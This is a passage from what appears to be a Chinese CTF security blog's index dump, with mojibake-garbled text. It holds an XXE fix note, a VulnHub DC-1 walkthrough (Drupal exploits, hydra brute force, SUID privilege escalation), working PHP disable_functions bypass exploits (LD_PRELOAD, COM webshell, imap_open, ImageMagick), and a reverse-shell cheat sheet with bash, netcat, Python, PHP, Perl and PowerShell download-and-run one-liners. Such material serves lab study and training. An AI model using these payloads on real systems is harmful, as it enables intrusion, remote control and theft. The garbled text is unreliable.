%remote;]&gt;&lt;message&gt;10&lt;&#x2F;message&gt; è¿˜ä¸å¤ªæ‡‚ï¼ï¼ï¼ï¼ æ¼æ´ä¿®å¤ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•PHPï¼š 1libxml_disable_entity_loader(true); Libxml2.9.0 ä»¥å ï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ JAVA: 12DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Pythonï¼š 12from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False)) è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ® è¿‡æ»¤å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…SYSTEMå’ŒPUBLIC å‚è€ƒï¼šå¥½æ–‡ï¼Œä½œè€…æœ‰å¿ƒäº†ï¼ï¼ï¼ https://www.freebuf.com/vuls/207639.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"xxe","slug":"xxe","permalink":"http://www.m00nback.xyz/tags/xxe/"}]},{"title":"VulnHubä¹‹DC-1é¶æœº","slug":"vulnhub-dc-1","date":"2019-12-12T14:35:35.000Z","updated":"2020-01-01T14:10:12.953Z","comments":true,"path":"2019/12/12/vulnhub-dc-1/","link":"","permalink":"http://www.m00nback.xyz/2019/12/12/vulnhub-dc-1/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•ä¸€ä¸‹ç©VulnHubä¸Šçš„DC-1é¶æœºçš„è¿‡ç¨‹ï¼ï¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•ä¸€ä¸‹ç©VulnHubä¸Šçš„DC-1é¶æœºçš„è¿‡ç¨‹ï¼ï¼ï¼ flag1æœ¬åœ°é…å¥½ç¯å¢ƒï¼Œè¿™é‡Œç½‘ç»œè¿æ¥æˆ‘ç”¨çš„æ˜¯NATæ–¹å¼ é¶æœºï¼š192.168.17.149 kaliï¼š192.168.17.146 äº‹å…ˆä¸çŸ¥é“ipçš„è¯å¯ä»¥å…ˆç”¨arp-scanæ‰«ä¸€ä¸‹ arp-scan --interface=eth0 --localnet nmapæ‰«ä¸‹çœ‹å¼€æ”¾äº†å“ªäº›ç«¯å£ 80ç«¯å£å¼€æ”¾ï¼Œè®¿é—®ä»¥ä¸‹ç½‘ç«™ çœ‹åˆ°æ˜¯Drupalçš„cmsï¼Œæ‰“å¼€msfï¼Œsearchä¸€ä¸‹ï¼Œç”¨æœ€æ–°çš„exploit(unix/webapp/drupal_drupalgeddon2)ï¼ŒæˆåŠŸè¿”å›meterpreterï¼Œè¿›å…¥shellï¼Œæ‰§è¡Œå‘½ä»¤è¿›å…¥ä¸€ä¸ªæ ‡å‡†çš„shellï¼Œlså¾—åˆ°flag1ï¼ŒæŸ¥çœ‹å†…å®¹ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; flag2æç¤ºè®©æˆ‘ä»¬çœ‹é…ç½®æ–‡ä»¶ï¼Œæœä¸€ä¸‹é…ç½®æ–‡ä»¶ä½ç½®/sites/default/settings.php å¾—åˆ°flag2å’Œæ•°æ®åº“è´¦å·å¯†ç  flag3ç™»é™†ä¸€ä¸‹mysql mysql -h localhost -u dbuser -p æŸ¥çœ‹drupaldbé‡Œusersè¡¨é‡Œçš„å†…å®¹ æœ‰ä¸¤ç§æ–¹æ³•ï¼š æ–¹å¼1ï¼š ç”¨åŒæ ·çš„åŠ å¯†æ–¹å¼åŠ å¯†ä¸€ä¸ªæˆ‘ä»¬çŸ¥é“çš„å¯†é’¥ï¼Œç„¶åupdateæ•°æ®åº“ä¿®æ”¹åŸå¯†ç ï¼Œåœ¨Drupal7é¡¹ç›®æ‰€åœ¨çš„ç›®å½•ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯è·å¾—åŠ å¯†ç»“æœ php scripts/password-hash.sh admin ç„¶åå†æ•°æ®åº“é‡Œæ›´æ–° update users set pass=&quot;$S$DsBR4rNeiIzheuLDAdLE932hUtDgoeE6BFmP2oRifCt.4piniN7u&quot; where name=&quot;admin&quot;; ç™»é™†ä¸€ä¸‹ï¼Œåœ¨Dashboardå‘ç°flag3ï¼Œæç¤ºæˆ‘ä»¬passwd æ–¹å¼2ï¼š æŸ¥çœ‹ä¸‹Drupalçš„ç‰ˆæœ¬ï¼Œincludes/bootstrap.incæ˜¯é»˜è®¤çš„ç‰ˆæœ¬ä¿¡æ¯ cat /var/www/includes/bootstrap.inc | grep VERSION å¯ä»¥çœ‹åˆ°æ˜¯7.24çš„ç‰ˆæœ¬ï¼Œsearchsploitæœç´¢ä¸€ä¸‹ å‘ç°å¥½åƒæœ‰sqlæ³¨å…¥æ¼æ´ï¼Œç›´æ¥ç”¨exp(/usr/share/exploitdb/exploits/php/webapps/34992.py) python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.17.149/ -u moonback -p moonback æˆ‘ä»¬å°±æˆåŠŸåˆ›å»ºä¸€ä¸ªå’Œadminä¸€æ ·çš„ç”¨æˆ·ï¼Œå…¶ä»–çš„expåº”è¯¥ä¹Ÿå¯ä»¥ç”¨ï¼Œæ²¡æœ‰æµ‹è¯• flag4è·Ÿç€flag3çš„æç¤ºï¼Œçœ‹çœ‹/etc/passwdå§ï¼Œæ‰¾åˆ°flag4ï¼Œå­˜åœ¨flag4ç”¨æˆ· ä¼šä¸ä¼šæ˜¯å¼±å£ä»¤ï¼Ÿç”¨hydraçˆ†ç ´ä¸€ä¸‹å§ hydra -l flag4 -P /root/Desktop/å­—å…¸/pass.txt ssh://192.168.17.149 -t 64 æœ€åçˆ†ç ´å‡ºæ¥çš„æ˜¯orangeï¼Œsshç™»ä¸Š,å¾—åˆ°flag4ï¼Œæç¤ºä¸‹ä¸€ä¸ªflagåœ¨/rootç›®å½•ä¸‹ thefinalflagææƒå§ï¼æç¤ºä¹Ÿç»™äº†ç”¨findææƒï¼ˆsuidææƒï¼‰ find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; #æŸ¥çœ‹å…·æœ‰rootç”¨æˆ·æƒé™çš„SUIDæ–‡ä»¶ å‘ç°findå‘½ä»¤åœ¨é‡Œé¢ï¼Œsuidææƒçš„å¤§æ¦‚æ„æ€å°±æ˜¯ï¼šå¦‚æœå‘½ä»¤ä»¥SUIDæƒé™è¿è¡Œï¼Œæ‰€æœ‰é€šè¿‡è¯¥å‘½ä»¤æ‰§è¡Œçš„å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™è¿è¡Œ find /etc/passwd -exec whoami \\; æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®©å®ƒå¼¹ä¸ªrootçš„shell find /etc/passwd -exec /bin/sh \\; æˆåŠŸé€šå…³ï¼ï¼ï¼","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.m00nback.xyz/tags/VulnHub/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://www.m00nback.xyz/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"MSF","slug":"MSF","permalink":"http://www.m00nback.xyz/tags/MSF/"}]},{"title":"ç»•è¿‡phpéƒ¨åˆ†é…ç½®","slug":"bypass-php-ini","date":"2019-11-29T08:49:44.000Z","updated":"2020-01-16T10:03:53.292Z","comments":true,"path":"2019/11/29/bypass-php-ini/","link":"","permalink":"http://www.m00nback.xyz/2019/11/29/bypass-php-ini/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†ç»•è¿‡ä¸€äº›phpé…ç½®çš„æ–¹æ³•ï¼","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†ç»•è¿‡ä¸€äº›phpé…ç½®çš„æ–¹æ³•ï¼ bypass disable_functionsé¡¾åæ€ä¹‰ï¼Œdisable_functionså³ä¸èƒ½ä½¿ç”¨çš„phpå‡½æ•° LD_PRELOADLD_PRELOADæ˜¯Linuxä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®¾ç½®æˆä¸€ä¸ªæŒ‡å®šåº“çš„è·¯å¾„ï¼ŒåŠ¨æ€é“¾æ¥æ—¶è¾ƒå…¶ä»–åº“æœ‰ç€æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œå…è®¸é¢„åŠ è½½æŒ‡å®šåº“ä¸­çš„å‡½æ•°å’Œç¬¦å·è¦†ç›–æ‰åç»­é“¾æ¥çš„åº“ä¸­çš„å‡½æ•°å’Œç¬¦å· phpçš„mail()å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šé»˜è®¤è°ƒç”¨ç³»ç»Ÿç¨‹åº/usr/sbin/sendmailï¼Œè€Œ/usr/sbin/sendmailä¼šè°ƒç”¨getuid()ã€‚å¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡LD_PRELOADçš„æ–¹å¼æ¥åŠ«æŒgetuid()ï¼Œå†ç”¨mail()å‡½æ•°æ¥è§¦å‘sendmailç¨‹åºè¿›è€Œæ‰§è¡Œè¢«åŠ«æŒçš„getuid()ï¼Œä»è€Œå°±èƒ½æ‰§è¡Œæ¶æ„ä»£ç äº† æ‹ä¸‹æ€è·¯ï¼š ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º uid_t getuid(void); çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ evil.so è¿è¡Œ PHP å‡½æ•° putenv()ï¼Œè®¾å®šç¯å¢ƒå˜é‡ LD_PRELOAD ä¸º evil.soï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡ è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ /usr/sbin/sendmailï¼Œç”±äºä¸Šä¸€æ­¥ LD_PRELOAD çš„ä½œç”¨ï¼Œsendmail è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° getuid() è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ evil.so ä¸­çš„åŒå getuid() æ‰€åŠ«æŒ è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆsystem()ã€exec() ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ æ€æ ·ç¼–å†™ä¸€ä¸ªå…±äº«åº“æ–‡ä»¶å‘¢ï¼Ÿ ç¼–å†™test.c 12345678910#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int geteuid() &#123; const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;); if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); system(cmdline);&#125; ç¼–è¯‘ç”Ÿæˆå…±äº«åº“æ–‡ä»¶ï¼š gcc -shared -fPIC test.c -o test.so ç»•è¿‡disable_functions githubä¸Šæœ‰ä¸ªé¡¹ç›® EXPåœ°å€ï¼šhttps://github.com/l3m0n/Bypass_Disable_functions_Shell è¿™é‡Œé¢çš„ä»“åº“é‡Œæœ‰ç¼–è¯‘ç”Ÿæˆå¥½çš„å…±äº«åº“æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œé€šè¿‡è®¾ç½®EVIL_CMDLINEæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ phpåˆ©ç”¨ä»£ç ï¼š 12345&lt;?php putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;); &#x2F;&#x2F;EVIL_CMDLINE&#x3D;shellå‘½ä»¤ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;); &#x2F;&#x2F;LD_PRELOAD&#x3D;åŠ¨æ€åŠ è½½åº“çš„ä½ç½®mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F;ç”¨mailå‡½æ•°è§¦å‘?&gt; è¿™ä¸Šé¢æœ‰é“é¢˜ï¼ˆRCE meï¼‰æˆ‘ç”¨çš„å°±æ˜¯ç”¨çš„è¿™ç§æ–¹æ³•http://www.moonback.xyz/2019/11/06/syc-ctf-wp/ COMç»„ä»¶éœ€è¦phpé…ç½®é‡Œå¼€å¯com.allow_dcomï¼Œåœ¨php/ext/é‡Œé¢æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨php_com_dotnet.dllè¿™ä¸ªæ–‡ä»¶ extension=php_com_dotnet.dll com.allow_dcom = true EXP: 123456789&lt;?php$command &#x3D; $_GET[&#39;cmd&#39;];$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ Shell.Applicationä¹Ÿèƒ½$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤$stdout &#x3D; $exec-&gt;StdOut();$stroutput &#x3D; $stdout-&gt;ReadAll();echo $stroutput;?&gt; è¿™é‡Œåˆ›å»ºä¸€ä¸ªCOMå¯¹è±¡ï¼Œç„¶åé€šè¿‡è°ƒç”¨COMå¯¹è±¡çš„exec()æ–¹æ³•æ¥å®ç°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œç»•è¿‡disable_functionsç¦ç”¨PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°çš„é™åˆ¶ imap_open(CVE-2018-19518)åœ¨php.iniä¸­å¼€å¯imap.enable_insecure_rshé€‰é¡¹ä¸ºOn å…·ä½“åŸç†å‚è§è¿™ä½å¤§ä½¬çš„åšå®¢ï¼šhttps://www.mi1k7ea.com/2019/06/02/æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•/#0x07-åˆ©ç”¨imap-open-ç»•è¿‡ EXP: 1234567891011&lt;?phperror_reporting(0);if (!function_exists(&#39;imap_open&#39;)) &#123; die(&quot;no imap_open function!&quot;);&#125;$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &quot;|base64\\t-d|sh&#125;&quot;;&#x2F;&#x2F;$server &#x3D; &#39;x -oProxyCommand&#x3D;echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &#39;|base64$IFS$()-d|sh&#125;&#39;;imap_open(&#39;&#123;&#39; . $server . &#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F; or var_dump(&quot;\\n\\nError: &quot;.imap_last_error());sleep(5);echo file_get_contents(&quot;&#x2F;tmp&#x2F;cmd_result&quot;);?&gt; ImageMagickè¿™é‡Œç›´æ¥ä¸ŠEXP: 1234567891011121314151617181920&lt;?phpecho &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\\n&quot;;$command &#x3D; isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#39;id&#39;;echo &quot;Run command: $command\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n&quot;;$data_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);$imagick_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);$exploit &#x3D; &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;image.jpg&quot;|$command&gt;$data_file&quot;)&#39;pop graphic-contextEOF;file_put_contents(&quot;$imagick_file&quot;, $exploit);$thumb &#x3D; new Imagick();$thumb-&gt;readImage(&quot;$imagick_file&quot;);$thumb-&gt;writeImage(tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;));$thumb-&gt;clear();$thumb-&gt;destroy();echo file_get_contents($data_file);?&gt; bypass allow_url_includeall_url_includeå³æ˜¯å¦å…è®¸è¿œç¨‹åŒ…å«ï¼Œé»˜è®¤å…³é—­ SMBæœåŠ¡å®‰è£…SAMBAæœåŠ¡å™¨ apt-get install samba åˆ›å»ºå…±äº«ç›®å½• mkdir /smb chmod 0555 /smb/ chown -R nobody:nogroup /smb/ é…ç½®SAMBAæœåŠ¡å™¨é…ç½®æ–‡ä»¶ echo &gt; /etc/samba/smb.conf å…¶ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ 123456789101112131415161718[global]workgroup &#x3D; WORKGROUPserver string &#x3D; Samba Server %vnetbios name &#x3D; indishell-labsecurity &#x3D; usermap to guest &#x3D; bad username resolve order &#x3D; bcast hostdns proxy &#x3D; nobind interfaces only &#x3D; yes[ethan]path &#x3D; &#x2F;smbwritable &#x3D; noguest ok &#x3D; yesguest only &#x3D; yesread only &#x3D; yesdirectory mode &#x3D; 0555force user &#x3D; nobody é‡å¯æœåŠ¡ service smbd restart è®¿é—®å°±å¯ä»¥é€šè¿‡\\\\192.168.23.129\\ethan\\shell.php Webdavå¯ä»¥åœ¨dockeré‡Œæ­ä¸€ä¸ª docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 8000:80 --rm --name webdav bytemark/webdav ç„¶åæŠŠphpæ–‡ä»¶æ”¾åˆ°/root/webdav/data/é‡Œé¢ï¼ŒåŒ…å«//ip:8000//webdav/shell.phpå°±è¡Œ bypass open_basediropen_basedirå³ç”¨æ¥å¯¹ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸ å…·ä½“å†…å®¹å¯ä»¥å‚è§å¤§ä½¬çš„åšå®¢https://www.mi1k7ea.com/2019/07/20/æµ…è°ˆå‡ ç§Bypass-open-basedirçš„æ–¹æ³•/ glob://ä¼ªåè®®symlink()å‡½æ•°","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"php","slug":"php","permalink":"http://www.m00nback.xyz/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"http://www.m00nback.xyz/tags/bypass/"}]},{"title":"shellå’Œåå¼¹shell","slug":"reverse-shell","date":"2019-11-27T14:00:01.000Z","updated":"2019-11-29T08:42:49.385Z","comments":true,"path":"2019/11/27/reverse-shell/","link":"","permalink":"http://www.m00nback.xyz/2019/11/27/reverse-shell/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†shellå’Œåå¼¹shellçš„ä¸€äº›å¸¸è§æ–¹æ³•ä»¥åŠå¦‚ä½•åœ¨shellä¸‹è½½æ–‡ä»¶ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†shellå’Œåå¼¹shellçš„ä¸€äº›å¸¸è§æ–¹æ³•ä»¥åŠå¦‚ä½•åœ¨shellä¸‹è½½æ–‡ä»¶ï¼ åå¼¹shellä»€ä¹ˆæ˜¯åå¼¹shellï¼Ÿ åå¼¹shellï¼Œå³reverse shellï¼Œä¸€èˆ¬æƒ…å†µä¸‹æŒ‡åœ¨æœ¬åœ°çš„å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯å¾—ä»¥æ‰§è¡Œã€‚ æ­£å‘è¿æ¥å‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ï¼ŒwebæœåŠ¡ï¼Œsshï¼Œtelnetç­‰ç­‰ï¼Œéƒ½æ˜¯æ­£å‘è¿æ¥ã€‚ ä½†è¿™ç§æœ‰å±€é™æ€§ï¼š å¦‚æœè¢«æ§ç«¯å†å†…ç½‘ä¸­ï¼Œä¸èƒ½ç›´æ¥è¿æ¥ é˜²ç«å¢™çš„é™åˆ¶ åå¼¹shellå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§åˆ¶ç«¯ä¸»åŠ¨è¿æ¥æ§åˆ¶ç«¯çš„è¿™ä¸€ç«¯å£ï¼Œæ§åˆ¶ç«¯å¯ä»¥é€šè¿‡è¿™ä¸€ç«¯å£è¿›è¡Œç›¸å…³å‘½ä»¤æ“ä½œã€‚ åå‘shellé€šå¸¸ç”¨äºè¢«æ§ç«¯å› é˜²ç«å¢™å—é™ã€æƒé™ä¸è¶³ã€ç«¯å£è¢«å ç”¨ç­‰æƒ…å½¢ï¼ŒåŒæ—¶ä¹Ÿå®ç°äº†è¢«æ§ç«¯çš„ç²¾å‡†æ§åˆ¶ï¼ˆæŒ‡å®šäº†è¢«æ§åˆ¶ç«¯çš„IPï¼Œé™¤æ­¤ä¹‹å¤–çš„æ˜¯æ— æ³•å’Œè¢«æ§ç«¯æ— æ³•è¿æ¥ï¼‰ã€‚ ä¸‹é¢çš„ä¾‹å­ä¸»è¦æ˜¯åå‘åå¼¹shellï¼Œä»¥ä¸‹çš„æœ‰äº›æ–¹æ³•å¯å°†/bin/bashæ›¿æ¢æˆcmd.exeç”¨äºwindowsåå¼¹shell åå¼¹shellbash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;port 0&gt;&amp;1 bash -i æ‰“å¼€ä¸€ä¸ªäº¤äº’çš„bash &gt;&amp; å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º /dev/tcp/x.x.x.x/port æ„ä¸ºè°ƒç”¨socket,å»ºç«‹socketè¿æ¥,å…¶ä¸­x.x.x.xä¸ºè¦åå¼¹åˆ°çš„ä¸»æœºipï¼Œportä¸ºç«¯å£ 0&gt;&amp;1 æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå®ç°ä½ ä¸åå¼¹å‡ºæ¥çš„shellçš„äº¤äº’ æ³¨ï¼š/dev/tcp/ æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œè¯»å†™è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚åŒç†ï¼ŒLinuxä¸­è¿˜å­˜åœ¨/dev/udp/ã€‚ netcatLinuxä¸­ncå‘½ä»¤æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œå…¨ç§°æ˜¯netcat é€‰é¡¹ï¼š 1234567891011121314-g&lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šè®¾ç½®8ä¸ªï¼›-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ï¼›-hï¼šåœ¨çº¿å¸®åŠ©ï¼›-i&lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ï¼›-lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„èµ„æ–™ï¼›-nï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›-o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ï¼›-p&lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ï¼›-rï¼šæŒ‡å®šæºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿›è¡Œéšæœºçš„é€‰æ‹©ï¼›-s&lt;æ¥æºä½å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼›-uï¼šä½¿ç”¨UDPä¼ è¾“åè®®ï¼›-vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-w&lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ï¼›-zï¼šä½¿ç”¨0è¾“å…¥&#x2F;è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ å¸¸ç”¨çš„å‘½ä»¤ï¼š 1234567è¢«æ§ç«¯ï¼šnc 192.168.31.174 8080 -t -e &#x2F;bin&#x2F;bashé€šè¿‡webshellæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ncå‘½ä»¤ç›´æ¥å»ºç«‹ä¸€ä¸ªtcp 8080 çš„ä¼šè¯è¿æ¥ï¼Œç„¶åå°†æœ¬åœ°çš„bashé€šè¿‡è¿™ä¸ªä¼šè¯è¿æ¥åå¼¹ç»™ç›®æ ‡ä¸»æœºï¼ˆ192.168.31.174ï¼‰æ§åˆ¶ç«¯ï¼šnc -lvp 8080ä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬8080ç«¯å£ï¼Œå¹¶æ˜¾ç¤ºå‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ Python1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; å¦‚æœç›®æ ‡æœºå™¨ä¸Šæœ‰ptyæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ 1python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; Powershell1powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.159.134 -p 6666 -e cmd ç”¨äºwindowsçš„åå¼¹shell php1php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; Perlæ–¹æ³•1ï¼š 1perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; æ–¹æ³•2ï¼š 1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; Rubyæ–¹æ³•1ï¼š 1ruby -rsocket -e &#39;exit if 